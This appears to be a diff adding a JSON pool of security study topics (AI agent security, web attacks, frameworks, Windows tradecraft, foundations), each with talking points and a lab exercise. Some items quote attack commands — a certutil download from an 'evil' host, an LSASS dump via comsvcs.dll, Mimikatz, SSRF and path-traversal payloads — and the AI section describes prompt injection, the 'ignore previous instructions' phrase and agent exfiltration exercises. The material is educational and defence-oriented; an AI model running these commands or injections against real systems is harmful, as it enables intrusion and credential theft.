@@ -1,0 +1,305 @@
+{
+  "_meta": {
+    "description": "Curated concept pool for the daily 'Concept of the Day' segment. Cycles daily so the same concept doesn't repeat within ~5 weeks (35 concepts). Weighted toward AI/agent topics because the operator is building self-autonomous agents and reads the AI Engineer ecosystem.",
+    "rotation_order": [
+      "ai_security",
+      "web_security",
+      "frameworks",
+      "tradecraft",
+      "foundations"
+    ]
+  },
+  "ai_security": [
+    {
+      "title": "Prompt injection vs jailbreaking",
+      "summary": "Prompt injection is a model-architecture attack where untrusted text in the prompt hijacks the model. Jailbreaking is the user actively trying to bypass safety training. They are not the same threat model.",
+      "talking_points": [
+        "Direct prompt injection: user types 'ignore previous instructions and do X' — that's jailbreaking, the model can refuse.",
+        "Indirect prompt injection: an attacker plants text on a webpage the agent reads, and the agent obeys the planted text without knowing. This is the OWASP Top 10 for LLM Apps #1.",
+        "Defences: instruction hierarchy, structured tool calls, output validation, sandboxing. None of these is foolproof — this is an unsolved problem."
+      ],
+      "build_it": "Build a small ReAct agent that reads a webpage, then inject malicious text into that webpage at fetch time. See when your agent obeys the page vs. its original instruction."
+    },
+    {
+      "title": "Tool-use attacks in autonomous agents",
+      "summary": "When an LLM agent can call tools (file read, shell exec, HTTP fetch), every tool call is a code-execution surface. The agent is effectively a confused deputy — the model decides which tool to call, but the tool runs with the agent's full privileges.",
+      "talking_points": [
+        "Tool poisoning: an attacker registers a malicious tool in an MCP server. The model picks it because the description looks legitimate.",
+        "Confused deputy: a junior agent is tricked into calling a privileged API it was never supposed to touch directly.",
+        "The fix is not better prompts — it's capability-based security. The agent can say 'send email' but cannot say 'send email to attacker@evil.com with my SSN attached'."
+      ],
+      "build_it": "Give an agent access to a 'send_email' tool with a content filter. Try to get it to exfiltrate data by encoding the payload in a benign-looking subject line."
+    },
+    {
+      "title": "Harness engineering for AI agents",
+      "summary": "The harness is the runtime that wraps the model: tool definitions, retry logic, error handling, context management, evals, observability. The model is maybe 30% of an agent. The harness is 70%.",
+      "talking_points": [
+        "Treat the harness like production code. Type everything. Log every tool call. Have unit tests for the tool router.",
+        "Evals are not optional. If you can't measure whether your agent succeeded, you can't improve it.",
+        "Context rot: every token in the context window degrades the model's attention. Aggressively summarise, retrieve on demand, and reset context between tasks."
+      ],
+      "build_it": "Take a ReAct agent with a 3-tool setup. Add structured logging, an eval harness with 5 tasks, and a context-window budget alarm. Measure task success rate before/after."
+    },
+    {
+      "title": "Self-autonomous agents — when to let go of the wheel",
+      "summary": "An autonomous agent runs a loop without human approval. This is the highest-leverage and highest-risk pattern. The discipline is: small blast radius, fast rollback, hard stop conditions.",
+      "talking_points": [
+        "Start with a fully-confined agent: read-only filesystem, no network, no shell. Let it reason about a problem. Once it's reliably safe, widen permissions by one notch.",
+        "Hard stop conditions: time budget, cost budget, specific error patterns, anomalous tool sequences. The agent must be willing to say 'I don't know' rather than guess.",
+        "Always keep a human in the loop for irreversible actions (delete, send, pay). The agent can queue, the human pulls the trigger."
+      ],
+      "build_it": "Build a 'read the codebase, suggest a refactor' agent. No writes. Run it on a real project. Count false-positive suggestion rate. Only add write permission when the rate is below your threshold."
+    },
+    {
+      "title": "MCP (Model Context Protocol) and its attack surface",
+      "summary": "MCP is a JSON-RPC protocol that lets an agent call tools exposed by external servers. Each MCP server is a dependency — and like every dependency, it can be malicious, vulnerable, or stale.",
+      "talking_points": [
+        "An MCP server runs as a subprocess. It can read your files, hit your network, or call your APIs. The agent is the only thing between the user and arbitrary code execution.",
+        "Trust model: the MCP server is treated like any other dependency. Pin versions. Read the source. Sandbox it. Treat untrusted MCP servers like untrusted npm packages.",
+        "Real attack: 'MCP tool poisoning' — an attacker publishes a tool called 'summarise' that secretly exfiltrates the conversation to a remote URL."
+      ],
+      "build_it": "Build a tiny MCP server with one tool. Read the source of one real MCP server in the wild (e.g., the official Anthropic ones) and look for what it could exfiltrate."
+    },
+    {
+      "title": "Sandboxing untrusted LLM-generated code",
+      "summary": "When an agent writes code that you then run, you're executing model output. The same threat model as 'running code from a stranger on the internet' — because that's what it is.",
+      "talking_points": [
+        "Firecracker / gVisor: hardware-virtualised sandboxes that boot a micro-VM in 125ms. Designed for exactly this.",
+        "Docker with seccomp + no network + no root + read-only filesystem: 80% of the safety of a micro-VM at 10% of the engineering cost.",
+        "Don't trust code review of agent output. The agent can write code that looks correct but is malicious by intent. Run it sandboxed, period."
+      ],
+      "build_it": "Run a Claude/GPT-generated Python script inside `gVisor runsc` or a Firecracker microVM. Time the boot. Compare to Docker."
+    },
+    {
+      "title": "Evals that actually measure what you care about",
+      "summary": "Most agent evals are vibes ('it looked good'). Real evals have a held-out test set, a deterministic scoring function, and a baseline to compare against.",
+      "talking_points": [
+        "Definition of Done: the agent must produce X, where X is verifiable (file written, test passing, API call returning 200).",
+        "LLM-as-judge is dangerous — it adds a second model that can be wrong in different ways. Prefer programmatic checks.",
+        "Bootstrap a test set from the first 50 real failures. Each one becomes a regression test. After 200 failures, your eval suite is real."
+      ],
+      "build_it": "Build a 10-task eval for a coding agent: 'add a function to X file', 'find the bug in Y', 'refactor Z'. Run it before and after every prompt change."
+    },
+    {
+      "title": "Memory, retrieval, and context engineering",
+      "summary": "An agent's 'memory' is whatever's in the context window. Long-term memory is a vector DB. The art is knowing which memories to load, when, and how much.",
+      "talking_points": [
+        "Naive RAG (embed the question, retrieve top-k) loses 30% of accuracy vs. hybrid search (BM25 + embeddings + metadata filters).",
+        "The 'lost in the middle' effect: LLMs attend to the start and end of context, ignore the middle. Put important stuff at the boundaries.",
+        "Episodic vs. semantic memory: episodic = what happened last Tuesday. Semantic = what I know about React. Most agents conflate these and lose both."
+      ],
+      "build_it": "Build a memory layer for a coding agent: episodic log of past sessions, semantic index of code conventions. Use a hybrid retriever. Measure context precision before/after."
+    }
+  ],
+  "web_security": [
+    {
+      "title": "SSRF — server-side request forgery",
+      "summary": "SSRF is when an attacker makes the server fetch a URL of their choice. Cloud-era SSRF is devastating because internal services trust each other on the VPC.",
+      "talking_points": [
+        "Classic: GET /proxy?url=http://169.254.169.254/latest/meta-data/ → AWS credentials.",
+        "Modern: bypass the URL allowlist with redirects, IPv6 notation, or DNS rebinding.",
+        "Defence in depth: separate VPC for sensitive services, IMDSv2, eBPF to detect unusual egress."
+      ],
+      "build_it": "Build a /fetch?url= endpoint behind a URL allowlist. Try to bypass it with redirects, DNS rebinding, and IPv6-mapped IPv4. Then fix."
+    },
+    {
+      "title": "OAuth 2.0 — the parts that bite",
+      "summary": "OAuth 2.0 is fine in the happy path. The edges — token leakage via Referer, open redirect in the redirect_uri, PKCE downgrade — are where accounts get hijacked.",
+      "talking_points": [
+        "Authorization code injection: steal a victim's code via open redirect on a different app. The victim's code is redeemed at your app, the attacker's account is now linked to the victim's data.",
+        "PKCE (RFC 7636) was meant to fix this. If your client doesn't enforce PKCE, an injection attack still works.",
+        "Implicit flow is dead. If you see response_type=token in the wild in 2026, it's a red flag."
+      ],
+      "build_it": "Set up a minimal OAuth client. Try the authorization-code-injection attack. Then add PKCE and try again. See the difference."
+    },
+    {
+      "title": "XSS in 2026 — why it's still here",
+      "summary": "React/Vue escaped XSS for the average case, but DOM XSS via innerHTML, prototype pollution, and the long tail of 'we needed raw HTML for this one thing' is still vulnerable.",
+      "talking_points": [
+        "Stored XSS in admin panels: attacker submits content, admin views it, session cookie exfiltrated. Even with HttpOnly, session-riding still works.",
+        "DOM-based XSS: the URL has the payload, JavaScript on the page reads location.hash or document.referrer unsafely. No server ever sees the payload.",
+        "Mutation XSS: a sanitizer produces safe HTML, the browser's parser produces something different when it's inserted. mXSS is back in vogue with HTML comments and namespace confusion."
+      ],
+      "build_it": "Find 5 XSS challenges on PortSwigger Academy. Do them all in a row. The patterns will stick."
+    },
+    {
+      "title": "JWT — the silent trust assumption",
+      "summary": "JWTs are signed, not encrypted. alg=none bypass, key-confusion attacks, and missing signature verification are the recurring foot-guns.",
+      "talking_points": [
+        "alg=none: the server accepts tokens with no signature because the client said 'no algorithm needed'. CVE-2015-9235 era, still found in 2026.",
+        "Key confusion: server uses an RSA public key to verify a token signed with the symmetric equivalent. The attacker signs with the public key as if it were the HMAC secret.",
+        "Best practice: only accept specific algorithms, never trust the alg header, use a library that fails closed on unexpected alg values."
+      ],
+      "build_it": "PortSwigger has 5 JWT labs. Do the alg=none one first, then the key-confusion one. These are the two attacks you must internalise."
+    },
+    {
+      "title": "Deserialization — still finding it in 2026",
+      "summary": "Java, Python pickle, PHP, .NET BinaryFormatter — all deserialise untrusted input into objects. The gadgets are well known and the attacks are reliable.",
+      "talking_points": [
+        "Java's ysoserial generates gadget chains for every popular library. Apache Commons Collections 3.x and 4.x are still in production.",
+        "Python's pickle is famously unsafe — never unpickle untrusted data. The __reduce__ method gives the attacker arbitrary code execution.",
+        "Defence: signed cookies, integrity-protected formats (CBOR, protobuf), strict schema validation, never deserialise into language-native types."
+      ],
+      "build_it": "Run ysoserial against a vulnerable Java app. Generate a payload that executes 'whoami'. Then patch the app to use a serializer that doesn't allow arbitrary classes."
+    },
+    {
+      "title": "Path traversal — the timeless classic",
+      "summary": "Path traversal (../) is the OWASP #1 forever. Modern variants: symlink races, mounted-filesystem confusion, Unicode normalisation differences.",
+      "talking_points": [
+        "Naive: GET /files?name=../../../etc/passwd. Modern frameworks block this. Naive code doesn't.",
+        "Symlink race: attacker uploads a file, then replaces it with a symlink before the server reads it.",
+        "Defence: chroot the file server, use a real allowlist of file IDs, never concatenate user input into a path."
+      ],
+      "build_it": "Build a /download?file= endpoint. Try every bypass: ../, %2e%2e%2f, ..%5c, null byte. Then fix it properly."
+    }
+  ],
+  "frameworks": [
+    {
+      "title": "OWASP Top 10 for LLM Applications",
+      "summary": "The OWASP Top 10 for LLM Apps (2025) is the de-facto checklist for AI security. Top items: prompt injection, sensitive info disclosure, supply chain, data poisoning, improper output handling.",
+      "talking_points": [
+        "LLM01 Prompt Injection: the number one. Both direct and indirect. Indirect (via documents the agent reads) is the bigger real-world risk.",
+        "LLM02 Sensitive Information Disclosure: agents trained or fine-tuned on customer data can leak it. Differential privacy, output filtering, redaction at every layer.",
+        "LLM03 Supply Chain: pre-trained models from HuggingFace, LoRA adapters, system prompts — every one is a dependency. Pin versions, scan for malware, treat like npm packages."
+      ],
+      "build_it": "Go through your agent's codebase and audit each LLM01-LLM10. For each: where am I exposed, what's the worst case, what's the cheapest fix."
+    },
+    {
+      "title": "NIST AI Risk Management Framework (AI RMF)",
+      "summary": "The NIST AI RMF (1.0, Jan 2023; GenAI profile, July 2024) is the US government's voluntary framework for managing AI risk. It maps to ISO 42001 and is the closest thing to a standard for AI governance.",
+      "talking_points": [
+        "Four functions: Govern, Map, Measure, Manage. The Govern function is the most-skipped and most-important.",
+        "GenAI profile (NIST AI 600-1) adds 12 new risks specific to generative models: confabulation, data leakage, information integrity, etc.",
+        "Mapping to OWASP LLM Top 10: roughly 80% overlap. Use both."
+      ],
+      "build_it": "Score your current agent on each NIST AI RMF function (1-5). Pick the lowest 2 scores and write a remediation plan."
+    },
+    {
+      "title": "MITRE ATT&CK — the attacker's playbook",
+      "summary": "ATT&CK is a public taxonomy of adversary techniques organised by tactic (why) and technique (how). Every detection and red-team engagement should map to it.",
+      "talking_points": [
+        "14 tactics: Recon → Resource Dev → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Exfiltration → Impact.",
+        "Each technique has sub-techniques. T1059.001 is PowerShell under T1059 Command and Scripting Interpreter. The numbers are stable — your detections and reports should reference them.",
+        "ATT&CK for Enterprise is the main one. ATT&CK for Mobile and ATT&CK for ICS exist for those domains."
+      ],
+      "build_it": "Take your last incident or red-team engagement. Map every observed action to an ATT&CK technique ID. Report it that way."
+    },
+    {
+      "title": "CVSS — how to read it and when to ignore it",
+      "summary": "CVSS gives a 0-10 severity score. It's useful for prioritisation. It's a terrible predictor of exploitability. CISA KEV is the better signal.",
+      "talking_points": [
+        "CVSS 9.8 RCE on a system with no internet exposure ≠ a real risk. CVSS 6.5 on an internet-facing auth-bypass with a public PoC = a real risk.",
+        "Vector string: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H. Read it. AV = Attack Vector, AC = Attack Complexity, PR = Privileges Required, UI = User Interaction, S = Scope, C/I/A = Confidentiality/Integrity/Availability impact.",
+        "CISA KEV is the actionable subset: known exploited in the wild. Patch those first, regardless of CVSS."
+      ],
+      "build_it": "Take 10 CVEs from this week's feed. For each, score 'real risk to my org' 1-5. Compare to CVSS base score. Note where they diverge."
+    },
+    {
+      "title": "Threat modeling — STRIDE vs PASTA vs LINDDUN",
+      "summary": "Threat modeling is structured thinking about what can go wrong. STRIDE (Microsoft) is the most-accessible. PASTA is risk-centric. LINDDUN is privacy-specific.",
+      "talking_points": [
+        "STRIDE: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege. Mnemonic for the 6 categories of threat.",
+        "PASTA: 7 stages from business objectives to technical vulnerabilities. Better for compliance-driven shops.",
+        "Always do threat modeling BEFORE writing code. 'Let's add threat modeling later' is the same as 'we'll add security later.'"
+      ],
+      "build_it": "Pick your current project. Run a 1-hour STRIDE session with the team. List every threat you find. Prioritise by ease of fix × severity."
+    }
+  ],
+  "tradecraft": [
+    {
+      "title": "Active Directory attack paths",
+      "summary": "AD is the soft centre of most enterprises. Kerberoasting, AS-REP roasting, NTLM relay, DCSync — the standard playbook.",
+      "talking_points": [
+        "Kerberoasting: any user with an SPN can be requested a TGS, which is encrypted with the user's password. Crack offline.",
+        "AS-REP roasting: same idea but for users with 'Do not require Kerberos preauthentication' set.",
+        "Defence: long passwords (25+ chars) for service accounts, AES encryption for Kerberos, monitor for unusual TGS requests."
+      ],
+      "build_it": "Set up a small AD lab (2-3 VMs). Run BloodHound. Find a Kerberoastable account. Crack the hash. Document the attack path."
+    },
+    {
+      "title": "Living off the land binaries (LOLBins)",
+      "summary": "LOLBins are legitimate Windows binaries that attackers abuse to avoid dropping malware. The technique is everywhere because it bypasses most EDRs.",
+      "talking_points": [
+        "certutil.exe can download files: certutil.exe -urlcache -split -f http://evil/payload.exe",
+        "rundll32.exe can execute arbitrary DLLs from a URL: rundll32.exe javascript:..\\mshtml,RunHTMLApplication",
+        "Detection: behavioural baselining. certutil shouldn't be making outbound HTTP in your environment. Alert on it."
+      ],
+      "build_it": "Use the LOLBAS project (lolbas-project.github.io) to find 5 LOLBins. Demonstrate each on a test machine. Write the detection rule for each."
+    },
+    {
+      "title": "Credential dumping and how to detect it",
+      "summary": "Once an attacker has code execution on a Windows box, the next move is to dump credentials. Mimikatz, comsvcs.dll, and procdump are the standard tools.",
+      "talking_points": [
+        "LSASS holds credentials in memory. comsvcs.dll + MiniDump: rundll32 comsvcs.dll, MiniDump <pid> C:\\out.dmp full — gives you a memory dump of LSASS.",
+        "Mimikatz: sekurlsa::logonpasswords — reads hashes directly from LSASS.",
+        "Detection: monitor for handle access to lsass.exe. Credential Guard (Win11) blocks most of this."
+      ],
+      "build_it": "In a lab VM, dump LSASS with comsvcs.dll. Open the dump in Mimikatz on an offline box. Find the credentials."
+    },
+    {
+      "title": "Phishing — the social engineering baseline",
+      "summary": "Phishing still works because humans are still the perimeter. Modern phishing-as-a-service kits (Tycoon, EvilProxy, Evilginx) make it trivial.",
+      "talking_points": [
+        "Evilginx: man-in-the-middle proxy that sits between user and the real login page. Captures session cookies, not passwords — bypasses MFA entirely.",
+        "Tycoon 2FA: similar idea, automated. $200-300 per campaign on the dark web.",
+        "Defence: FIDO2 hardware keys (YubiKey, Titan). Phishing-resistant by design. Nothing else matters until you have these."
+      ],
+      "build_it": "Set up Evilginx against a test login. Capture a session cookie. Use it. See the full attack. Then implement FIDO2 in your org."
+    }
+  ],
+  "foundations": [
+    {
+      "title": "Zero trust — the principle, not the product",
+      "summary": "Zero trust is 'never trust, always verify'. Every request is authenticated, authorised, and logged. Every network is hostile — including your own.",
+      "talking_points": [
+        "The classic perimeter model: trust everything inside the firewall. The 2020s proved that wrong (SolarWinds, Microsoft Exchange, MOVEit).",
+        "Zero trust in practice: identity-based access (mTLS + SPIFFE), microsegmentation, just-in-time credentials, no implicit trust between services.",
+        "It is not a product. Vendors will sell you 'zero trust gateways'. The real zero trust is a discipline that maps to NIST SP 800-207."
+      ],
+      "build_it": "Audit one internal service. List every place where 'internal' is the only authentication. Add mTLS, JWT, or service-account auth. That's zero trust for one service."
+    },
+    {
+      "title": "Cryptography — when to use what",
+      "summary": "AES-GCM for symmetric encryption, RSA-OAEP or X25519 for key exchange, Ed25519 for signatures, Argon2id for password hashing. The defaults are well-established.",
+      "talking_points": [
+        "Symmetric encryption: AES-256-GCM (authenticated) or ChaCha20-Poly1305. Never AES-CBC alone. Never AES-ECB at all.",
+        "Password hashing: Argon2id with parameters tuned to your hardware. Bcrypt is acceptable fallback. NEVER SHA-256, never MD5, never unsalted.",
+        "Random numbers: use the OS CSPRNG. /dev/urandom on Linux, BCryptGenRandom on Windows. Never Math.random. Never a hash of timestamp."
+      ],
+      "build_it": "Write a small 'crypto cheatsheet' for your project. Document which algorithm to use for which purpose. Code-review it against OWASP Cryptographic Storage Cheat Sheet."
+    },
+    {
+      "title": "Defense in depth — layers, not single solutions",
+      "summary": "No single control is perfect. Stack them so an attacker has to defeat every layer to succeed. The layers are: network, host, application, data, identity.",
+      "talking_points": [
+        "Network: segmentation, egress filtering, IDS/IPS.",
+        "Host: hardening baseline, EDR, application allowlisting.",
+        "Application: input validation, output encoding, parameterised queries, authn/authz on every endpoint.",
+        "Identity: MFA (FIDO2 preferred), least privilege, just-in-time access, regular access reviews.",
+        "Data: encryption at rest, encryption in transit, classification labels, DLP."
+      ],
+      "build_it": "Map your current controls to the 5 layers. Find the layer with the thinnest coverage. Add at least one control there."
+    },
+    {
+      "title": "The CIA triad and why it isn't enough",
+      "summary": "Confidentiality, Integrity, Availability — the original security model. Modern systems need more: non-repudiation, authenticity, accountability, privacy.",
+      "talking_points": [
+        "Confidentiality: who can read this data?",
+        "Integrity: has this data been tampered with?",
+        "Availability: can the legitimate user access this when they need it?",
+        "Adding: authenticity (proving the source is who they say), non-repudiation (can't deny taking an action), privacy (a meta-property that ties the others together)."
+      ],
+      "build_it": "Take an incident or near-miss. Decompose it against the CIA triad. Find which property was violated. Map to the control that should have prevented it."
+    },
+    {
+      "title": "Secure defaults and the principle of least surprise",
+      "summary": "Security lives in defaults. The right default is the safe one. The wrong default is the one the developer didn't think about.",
+      "talking_points": [
+        "Default-deny: APIs should require explicit opt-in for dangerous actions. /api/admin should 403 by default.",
+        "Default-secure: new users get the minimum privilege. The 'request elevation' flow needs review, not the initial state.",
+        "Default-transparent: log everything by default. Hiding logs by default is a security smell."
+      ],
+      "build_it": "Audit the last 3 features you shipped. Did the defaults favour security? If not, fix the defaults — every API call should fail closed."
+    }
+  ]
+}
